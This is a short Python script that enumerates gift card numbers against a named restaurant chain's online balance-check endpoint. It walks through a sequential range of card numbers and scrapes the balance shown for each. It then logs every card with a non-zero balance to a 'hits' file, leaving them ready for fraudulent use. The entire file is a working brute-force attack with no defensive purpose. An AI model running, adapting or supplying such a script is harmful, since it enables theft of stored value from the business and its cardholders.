import requests
from bs4 import BeautifulSoup
#from csv import writer
number2 = 17805000000000 # This is the valid start number. There might be other valid start numbers as well.
file1 = open("hits.txt", "a")
while number2 < 17805000099999: # This is the end of valid cards, or so we think, but that may only be for this range, if it even ends at that point.
    url = "https://www.erbertandgerberts.com/wp-content/themes/erbertandgerberts/ajax/gift-card-balance.php?cardNumber=" # This is the beginning of the url.
    end = "&_=1597085699964" # This is probably an identifier tag of some sort. It might even be expired by now. It's included anyways.
    durl = url + str(number2) + end # Put the URL together.
    response = requests.get(durl) # Request that page.
    if response.status_code == 200: # If we were successful in grabbing the page.
        soup = BeautifulSoup(response.text, 'html.parser') # Grab the page into html parser 
        balance2 = soup.find(class_='mb0 text-xlg text-bold text-blue lh1 pt05 pb05') # Find the class that has the balance
        balance = balance2.contents[0] # This is the balance
        secondNum = str(number2) # The card number
        sep = "-"
        n = "\n"
        number2 += 1 # Now we're going to check the next card, so we need to increment
        if (balance != "$0.00"): # We don't want empty cards!
            print(balance)
            cleaned = str(secondNum) + str(sep) + str(balance) + str(n) # A nice looking string.
            file1.write(cleaned) # Write it!
        #else:
            #print("bad"+balance) # Use for debugging if you aren't getting any results. 
    else:
        print (response.text) 
        print(response.status_code) # If we didn't get code 200, find out what's wrong with this. 
    
